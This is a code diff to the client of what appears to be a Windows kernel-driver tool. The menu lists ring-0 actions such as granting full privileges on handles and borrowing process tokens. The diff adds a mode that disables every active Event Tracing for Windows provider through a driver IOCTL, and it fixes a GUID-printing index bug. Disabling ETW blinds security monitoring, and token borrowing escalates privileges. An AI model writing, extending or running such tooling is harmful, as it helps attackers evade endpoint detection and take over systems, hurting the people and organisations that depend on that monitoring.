@@ -27,7 +27,7 @@ int main(int argc, char * argv[])
 			"8: (RING 0) SET FULL PRIVS ON <int:PID> <hex:handleID>\n\t"
 			"9: (RING 3) LIST KERNEL MODULES\n\t"
 			"10: (RING 0) BORROW A TOKEN FOR <int:PID> FROM <int:PID>\n\t"
-			"11: (RING 0) LIST ALL ACTIVE ETWs\n\t"
+			"11: (RING 0) LIST ALL ACTIVE ETWs <0: list only | 1: disable all active>\n\t"
 		);
 		return 1;
 	}
@@ -234,6 +234,13 @@ int main(int argc, char * argv[])
 		}
 		case 11: //LIST ALL ACTIVE ETWs
 		{
+			if (argc < 3)
+			{
+				printf("requred second paramter: 0 -> list active ETWs only, 1 -> disable all active ETWs\n");
+				exit(1);
+			}
+			int disable = std::atoi(argv[2]);
+
 			HMODULE Ntoskrnl;
 			Ntoskrnl = LoadLibrary(L"ntoskrnl.exe");//LoadLibraryEx(L"ntkrnlmp.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
 			//__debugbreak();
@@ -272,27 +279,28 @@ int main(int argc, char * argv[])
 			hDriver = attachToDriver();
 			DWORD64 SiloDriverState = 0;
 			PETW etw = new ETW{EtwpDebuggerDataAddr, &SiloDriverState};
-			ETW_GUID guids[1500];
+			etw->disable = disable;
+			ETW_GUID guids[ETW_BUFFER];
 
 			if (success = DeviceIoControl(hDriver, IOCTL_LIST_ETW, etw, sizeof(guids), &guids, sizeof(guids), nullptr, nullptr))
 			{
-				printf("number of enabled ETWs: %d\n", etw->numberOfEnabledETWs);
 				printf("enabled GUIDs:\n");
 				for (int i = 0; i < etw->numberOfEnabledETWs; i++)
 				{
 					printf("\t%08x-%04x-%04x-%02x%02x-%02x%02x%02x%02x%02x%02x\n",
 						guids[i].guid.Data1,
-						guids[1].guid.Data2,
+						guids[i].guid.Data2,
 						guids[i].guid.Data3,
 						guids[i].guid.Data4[0],
 						guids[i].guid.Data4[1],
-						guids[i].guid.Data4[2],
-						guids[i].guid.Data4[3],
+						guids[i].guid.Data4[2], 
+						guids[i].guid.Data4[3], 
 						guids[i].guid.Data4[4],
 						guids[i].guid.Data4[5],
 						guids[i].guid.Data4[6],
 						guids[i].guid.Data4[7]);
 				}
+				printf("number of enabled ETWs: [%d]\n", etw->numberOfEnabledETWs);
 			}
 			else
 			{
